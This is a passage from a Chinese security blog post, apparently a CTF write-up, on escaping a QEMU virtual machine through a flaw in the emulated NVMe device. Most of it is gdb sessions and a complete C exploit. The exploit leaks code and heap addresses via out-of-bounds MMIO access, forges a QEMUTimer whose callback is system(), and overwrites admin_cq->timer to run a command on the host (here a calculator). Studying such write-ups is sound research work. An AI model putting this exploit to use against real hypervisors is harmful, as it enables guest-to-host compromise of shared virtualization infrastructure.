class="keyword">in</span> /home/ctflag/tools/qemu/hw/block/nvme.c</span><br><span class="line"></span><br><span class="line">ad 3 <span class="string">"qemu-system-x86"</span> hit Breakpoint 2, nvme_mmio_write (opaque=0x557463fc33d0, addr=0x104, data=0x12345678, size=0x4) at /home/ctflag/tools/qemu/hw/block/nvme.c:1171</span><br><span class="line">1171	<span class="keyword">in</span> /home/ctflag/tools/qemu/hw/block/nvme.c</span><br><span class="line"></span><br><span class="line">gdb-peda$  x /gx 0x557463fc3e90+0x100</span><br><span class="line">0x557463fc3f90:	0x12345678deadbee//值已被写入</span><br><span class="line"></span><br><span class="line">root@ExecChrome:/home/ubuntu<span class="comment"># ./pcimem /sys/devices/pci0000\:00/0000\:00\:04.0/resource0 0x100 d</span></span><br><span class="line">/sys/devices/pci0000:00/0000:00:04.0/resource0 opened.</span><br><span class="line">Target offset is 0x100, page size is 4096</span><br><span class="line">mmap(0, 4096, 0x3, 0x1, 3, 0x100)</span><br><span class="line">PCI Memory mapped to address 0x7fd400531000.</span><br><span class="line">0x0100: 0x12345678DEADBEEF</span><br><span class="line">root@ExecChrome:/home/ubuntu<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>​        到现在，已经可以很方便的完成leak，控制流的劫持需要修改存n-&gt;bar之后的某个指针。在NvmeCtrl结构体中存在admin_cq和admin_sq两个队列结构体。NvmeCQueue结构体中存在QEMUTimer类型的指针，当expire_time的定时到了后就会执行cb（opaque）。具体的定时不会设置，只有通过关机或重启动触发。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ptype NvmeCQueue</span><br><span class="line"><span class="built_in">type</span> = struct NvmeCQueue &#123;</span><br><span class="line">    struct NvmeCtrl *ctrl;</span><br><span class="line">    uint8_t phase;</span><br><span class="line">    uint16_t cqid;</span><br><span class="line">    uint16_t irq_enabled;</span><br><span class="line">    uint32_t head;</span><br><span class="line">    uint32_t tail;</span><br><span class="line">    uint32_t vector;</span><br><span class="line">    uint32_t size;</span><br><span class="line">    uint64_t dma_addr;</span><br><span class="line">    QEMUTimer *timer;</span><br><span class="line">    union &#123;</span><br><span class="line">        struct NvmeSQueue *tqh_first;</span><br><span class="line">        QTailQLink tqh_circ;</span><br><span class="line">    &#125; sq_list;</span><br><span class="line">    union &#123;</span><br><span class="line">        struct NvmeRequest *tqh_first;</span><br><span class="line">        QTailQLink tqh_circ;</span><br><span class="line">    &#125; req_list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db-peda$ ptype QEMUTimer</span><br><span class="line"><span class="built_in">type</span> = struct QEMUTimer &#123;</span><br><span class="line">    int64_t expire_time;</span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;//func ptr</span><br><span class="line">    void *opaque;//arg0</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    int attributes;</span><br><span class="line">    int scale;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ p <span class="variable">$3</span>-&gt;admin_cq</span><br><span class="line"><span class="variable">$8</span> = &#123;</span><br><span class="line">  ctrl = 0x557463fc33d0, </span><br><span class="line">  phase = 0x1, </span><br><span class="line">  cqid = 0x0, </span><br><span class="line">  irq_enabled = 0x1, </span><br><span class="line">  head = 0xa, </span><br><span class="line">  tail = 0xa, </span><br><span class="line">  vector = 0x0, </span><br><span class="line">  size = 0x100, </span><br><span class="line">  dma_addr = 0x34c74000, </span><br><span class="line">  timer = 0x7f6ed4266910, </span><br><span class="line">  sq_list = &#123;</span><br><span class="line">    tqh_first = 0x557463fc3f70, </span><br><span class="line">    tqh_circ = &#123;</span><br><span class="line">      tql_next = 0x557463fc3f70, </span><br><span class="line">      tql_prev = 0x557463fc3fc0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  req_list = &#123;</span><br><span class="line">    tqh_first = 0x0, </span><br><span class="line">    tqh_circ = &#123;</span><br><span class="line">      tql_next = 0x0, </span><br><span class="line">      tql_prev = 0x557463fc4010</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ p <span class="variable">$3</span>-&gt;admin_cq-&gt;timer</span><br><span class="line"><span class="variable">$9</span> = (QEMUTimer *) 0x7f6ed4266910</span><br><span class="line">gdb-peda$ p *(<span class="variable">$3</span>-&gt;admin_cq-&gt;timer)</span><br><span class="line"><span class="variable">$10</span> = &#123;</span><br><span class="line">  expire_time = 0xffffffffffffffff, </span><br><span class="line">  timer_list = 0x5574632dd1a0, </span><br><span class="line">  cb = 0x55746068fc2d &lt;nvme_post_cqes&gt;, </span><br><span class="line">  opaque = 0x557463fc3fd0, </span><br><span class="line">  next = 0x0, </span><br><span class="line">  attributes = 0x0, </span><br><span class="line">  scale = 0x1</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ p &amp;<span class="variable">$3</span>-&gt;bar</span><br><span class="line"><span class="variable">$11</span> = (NvmeBar *) 0x557463fc3e90</span><br><span class="line">gdb-peda$ p /x &amp;<span class="variable">$3</span>-&gt;admin_cq-&gt;timer</span><br><span class="line"><span class="variable">$12</span> = 0x557463fc3ff8</span><br><span class="line">b-peda$ p /x 0x557463fc3ff8-0x557463fc3e90</span><br><span class="line"><span class="variable">$13</span> = 0x168</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li>使用任意读完成code地址和heap地址的泄漏，由于在qemu的got表中存在system这里就省去了对libc地址的泄漏。</li>
+<li>通过修改admin_cq的timer，将timer指向id_ctrl最后一串为0的空间，踩坑发现参数摆放和结构体摆放位置要避开堆管理结构体，否则会free出错，或清空fd字段导致结构体错误。</li>
+<li>对于timer结构体的构造，需要保证timer_list列表正确。</li>
+</ul>
+<p><img src="https://i.loli.net/2019/07/04/5d1d70a1e141325559.jpg" alt="calc.jpg"></p>
+<h2 id="最终exploit"><a href="#最终exploit" class="headerlink" title="最终exploit"></a>最终exploit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ERROR \</span></span><br><span class="line">	<span class="keyword">do</span> &#123; \</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error at line %d, file %s (%d) [%s]\n"</span>, \</span><br><span class="line">		__LINE__, __FILE__, errno, strerror(errno)); <span class="built_in">exit</span>(<span class="number">1</span>); \</span><br><span class="line">	&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_SIZE 4096UL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_MASK (MAP_SIZE - 1)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">(<span class="keyword">void</span> * str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *filename = <span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pcimem_read</span><span class="params">(<span class="keyword">uint64_t</span> target, <span class="keyword">char</span> access_type, <span class="keyword">uint64_t</span> * read_result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Map one page */</span></span><br><span class="line">	<span class="keyword">void</span> *map_base = mmap(<span class="number">0</span>, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target &amp; ~MAP_MASK);</span><br><span class="line">	<span class="keyword">if</span>(map_base == (<span class="keyword">void</span> *) <span class="number">-1</span>) PRINT_ERROR;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"PCI Memory mapped to address 0x%08lx.\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">long</span>) map_base);</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">void</span> *virt_addr = map_base + (target &amp; MAP_MASK);</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">int</span> type_width = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">switch</span>(access_type) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">			*read_result = *((<span class="keyword">uint8_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">			*read_result = *((<span class="keyword">uint16_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">			*read_result = *((<span class="keyword">uint32_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">4</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">			*read_result = *((<span class="keyword">uint64_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">8</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Value at offset 0x%X (%p): 0x%0*lX\n"</span>, (<span class="keyword">int</span>) target, virt_addr, type_width*<span class="number">2</span>, read_result);</span><br><span class="line">	<span class="keyword">if</span>(munmap(map_base, MAP_SIZE) == <span class="number">-1</span>) </span><br><span class="line">		PRINT_ERROR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pcimem_write</span><span class="params">(<span class="keyword">uint64_t</span> target, <span class="keyword">char</span> access_type, <span class="keyword">uint64_t</span> writeval)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Map one page */</span></span><br><span class="line">	<span class="keyword">void</span> *map_base = mmap(<span class="number">0</span>, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target &amp; ~MAP_MASK);</span><br><span class="line">	<span class="keyword">if</span>(map_base == (<span class="keyword">void</span> *) <span class="number">-1</span>) PRINT_ERROR;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"PCI Memory mapped to address 0x%08lx.\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">long</span>) map_base);</span><br><span class="line">	<span class="keyword">uint64_t</span> read_result = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> type_width = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *virt_addr = map_base + (target &amp; MAP_MASK);</span><br><span class="line">	<span class="keyword">switch</span>(access_type) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">			*((<span class="keyword">uint8_t</span> *) virt_addr) = writeval;</span><br><span class="line">			read_result = *((<span class="keyword">uint8_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">			*((<span class="keyword">uint16_t</span> *) virt_addr) = writeval;</span><br><span class="line">			read_result = *((<span class="keyword">uint16_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">			*((<span class="keyword">uint32_t</span> *) virt_addr) = writeval;</span><br><span class="line">			read_result = *((<span class="keyword">uint32_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">4</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">			*((<span class="keyword">uint64_t</span> *) virt_addr) = writeval;</span><br><span class="line">			read_result = *((<span class="keyword">uint64_t</span> *) virt_addr);</span><br><span class="line">			type_width = <span class="number">8</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//readback not correct?</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Written 0x%0*lX; readback 0x%*lX\n"</span>, type_width, writeval, type_width, read_result);</span><br><span class="line">	<span class="keyword">if</span>(munmap(map_base, MAP_SIZE) == <span class="number">-1</span>) </span><br><span class="line">		PRINT_ERROR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((fd = open(filename, O_RDWR | O_SYNC)) == <span class="number">-1</span>)</span><br><span class="line">		PRINT_ERROR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>  data = <span class="number">0</span> ;</span><br><span class="line">	<span class="comment">//step 1: get binary address</span></span><br><span class="line">    pcimem_read(<span class="number">0x11b8</span>, <span class="string">'d'</span>,  &amp;data);</span><br><span class="line">	<span class="keyword">uint64_t</span> bin_addr = (<span class="keyword">uint64_t</span>)data - <span class="number">0x760aa3</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] binary @ 0x%lX\n"</span>, bin_addr);</span><br><span class="line">	<span class="keyword">uint64_t</span> system_addr = bin_addr + <span class="number">0x2bc600</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] system @ 0x%lX\n"</span>, system_addr);</span><br><span class="line">    <span class="comment">//step 2: get heap address</span></span><br><span class="line">    pcimem_read(<span class="number">0x128</span>, <span class="string">'d'</span>,  &amp;data);</span><br><span class="line">	<span class="keyword">uint64_t</span> heap_addr = (<span class="keyword">uint64_t</span>)data  - <span class="number">0x120</span> ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] heap @ 0x%lX\n"</span>, heap_addr);</span><br><span class="line">	<span class="comment">//step 3: fake obj</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$8 = &#123;</span></span><br><span class="line"><span class="comment">  expire_time = 0xffffffffffffffff, </span></span><br><span class="line"><span class="comment">  timer_list = 0x560d8ffde1a0, </span></span><br><span class="line"><span class="comment">  cb = 0x560d8ef61c2d &lt;nvme_post_cqes&gt;, </span></span><br><span class="line"><span class="comment">  opaque = 0x560d90cc4fd0, </span></span><br><span class="line"><span class="comment">  next = 0x0, </span></span><br><span class="line"><span class="comment">  attributes = 0x0, </span></span><br><span class="line"><span class="comment">  scale = 0x1</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">   <span class="keyword">char</span> cmd[] = <span class="string">"deepin-calculator\x00"</span>;</span><br><span class="line"><span class="comment">//  5555555547a4:	0x632d6e6970656564	0x6f74616c75636c61</span></span><br><span class="line"><span class="comment">//  5555555547b4:	0x000a786c25000072</span></span><br><span class="line">   <span class="keyword">uint64_t</span> cmd_addr = heap_addr + <span class="number">0xdb8</span> ;</span><br><span class="line">   <span class="keyword">uint64_t</span> fake_obj = heap_addr + <span class="number">0xd90</span>;</span><br><span class="line">   pcimem_write(<span class="number">0xd90</span>, <span class="string">'d'</span>, <span class="number">0xffffffffffffffff</span>);<span class="comment">//expire time</span></span><br><span class="line">   pcimem_write(<span class="number">0xd98</span>, <span class="string">'d'</span>, heap_addr - <span class="number">0xce6cf0</span> );<span class="comment">//timer list</span></span><br><span class="line">   pcimem_write(<span class="number">0xda0</span>, <span class="string">'d'</span>, system_addr);<span class="comment">//cb</span></span><br><span class="line">   pcimem_write(<span class="number">0xda8</span>, <span class="string">'d'</span>, cmd_addr);<span class="comment">//opaque</span></span><br><span class="line">   pcimem_write(<span class="number">0xdb8</span>, <span class="string">'d'</span>, <span class="number">0x632d6e6970656564</span>);<span class="comment">//deepin-calculator</span></span><br><span class="line">   pcimem_write(<span class="number">0xdc0</span>, <span class="string">'d'</span>, <span class="number">0x6f74616c75636c61</span>);</span><br><span class="line">   pcimem_write(<span class="number">0xdc8</span>, <span class="string">'d'</span>, <span class="number">0x72</span>);</span><br><span class="line">   pcimem_write(<span class="number">0x100</span>, <span class="string">'d'</span>, fake_obj);<span class="comment">//modify admin_cq-&gt;timer</span></span><br><span class="line">  <span class="comment">// pcimem_write(0x168, 'd', fake_obj);//modify admin_sq-&gt;timer</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://www.ssdfans.com/blog/2017/08/03/阿呆实战nvme之七/" target="_blank" rel="noopener">https://www.ssdfans.com/blog/2017/08/03/%e9%98%bf%e5%91%86%e5%ae%9e%e6%88%98nvme%e4%b9%8b%e4%b8%83/</a></li>
+<li><a href="https://stfpeak.github.io/2017/07/15/how-to-debug-qemu-devices/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/07/15/how-to-debug-qemu-devices/</a></li>
+<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sysfs/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-sysfs/index.html</a></li>
+<li><a href="https://www.tuicool.com/articles/MzqYbia" target="_blank" rel="noopener">https://www.tuicool.com/articles/MzqYbia</a></li>
+<li><a href="https://github.com/qemu/qemu/commit/5e3c0220d7e4f0361c4d36c697a8842f2b58340" target="_blank" rel="noopener">https://github.com/qemu/qemu/commit/5e3c0220d7e4f0361c4d36c697a8842f2b58340</a> </li>
+<li><a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://www.phrack.org/papers/vm-escape-qemu-case-study.html</a></li>
+<li><a href="https://github.com/w0lfzhang/vmescape" target="_blank" rel="noopener">https://github.com/w0lfzhang/vmescape</a> </li>
+<li><a href="https://github.com/billfarrow/pcimem" target="_blank" rel="noopener">https://github.com/billfarrow/pcimem</a></li>
+<li><a href="https://www.anquanke.com/post/id/86636" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86636</a></li>
+<li><a href="https://kitctf.de/writeups/hitb2017/babyqemu" target="_blank" rel="noopener">https://kitctf.de/writeups/hitb2017/babyqemu</a></li>
+<li><a href="https://www.w0lfzhang.com/2018/12/05/xnuca-SSD-QEMU-escape/" target="_blank" rel="noopener">https://www.w0lfzhang.com/2018/12/05/xnuca-SSD-QEMU-escape/</a></li>
+<li><a href="https://github.com/Kira-cxy/qemu-vm-escape/blob/master/writeup_zh.md" target="_blank" rel="noopener">https://github.com/Kira-cxy/qemu-vm-escape/blob/master/writeup_zh.md</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/vmescape/" rel="tag"># vmescape</a>
+          
+            <a href="/tags/qemu/" rel="tag"># qemu</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/30/网鼎杯pwn部分wp/" rel="next" title="网鼎杯pwn部分wp">
+                <i class="fa fa-chevron-left"></i> 网鼎杯pwn部分wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div onclick="showGitment()" id="gitment-display-button">显示 Gitment 评论</div>
+        <div id="gitment-container" style="display:none"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">greyd0g</p>
+              <p class="site-description motion-element" itemprop="description">day day up</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lovei.org" title="腹黑's Blog" target="_blank">腹黑's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.blogsir.com.cn" title="江sir's Blog" target="_blank">江sir's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://sec2hack.com/" title="Wfox's Blog" target="_blank">Wfox's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brucetg.github.io/" title="Brucetg's Blog" target="_blank">Brucetg's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影's Blog" target="_blank">奈沙夜影's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cyto.top/" title="Cytosineの's Blog" target="_blank">Cytosineの's Blog</a>
+                  </li>
+                
